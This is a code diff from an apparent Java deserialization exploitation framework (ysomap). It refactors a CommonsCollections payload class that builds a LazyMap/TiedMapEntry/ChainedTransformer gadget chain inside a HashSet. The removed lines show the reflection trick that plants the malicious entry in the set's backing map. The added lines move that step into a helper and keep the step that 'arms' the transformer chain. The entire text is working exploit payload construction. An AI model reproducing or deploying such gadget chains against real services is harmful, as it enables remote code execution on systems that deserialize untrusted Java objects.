@@ -5,12 +5,12 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import ysomap.bullets.Bullet;
-import ysomap.common.annotation.*;
 import ysomap.bullets.collections.TransformerWithTemplatesImplBullet;
+import ysomap.common.annotation.*;
+import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 import ysomap.payloads.AbstractPayload;
 
-import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
@@ -54,44 +54,9 @@ public class CommonsCollections5 extends AbstractPayload<HashSet> {
 
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
 
-        HashSet map = new HashSet(1);
-        map.add("foo");
-        Field f = null;
-        try {
-            f = HashSet.class.getDeclaredField("map");
-        } catch (NoSuchFieldException e) {
-            f = HashSet.class.getDeclaredField("backingMap");
-        }
-
-        ReflectionHelper.setAccessible(f);
-        HashMap innimpl = (HashMap) f.get(map);
-
-        Field f2 = null;
-        try {
-            f2 = HashMap.class.getDeclaredField("table");
-        } catch (NoSuchFieldException e) {
-            f2 = HashMap.class.getDeclaredField("elementData");
-        }
-
-        ReflectionHelper.setAccessible(f2);
-        Object[] array = (Object[]) f2.get(innimpl);
-
-        Object node = array[0];
-        if(node == null){
-            node = array[1];
-        }
-
-        Field keyField = null;
-        try{
-            keyField = node.getClass().getDeclaredField("key");
-        }catch(Exception e){
-            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
-        }
-
-        ReflectionHelper.setAccessible(keyField);
-        keyField.set(node, entry);
+        HashSet set = PayloadHelper.makeHashSetWithEntry(entry);
 
         ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj); // arm with actual transformer chain
-        return map;
+        return set;
     }
 }
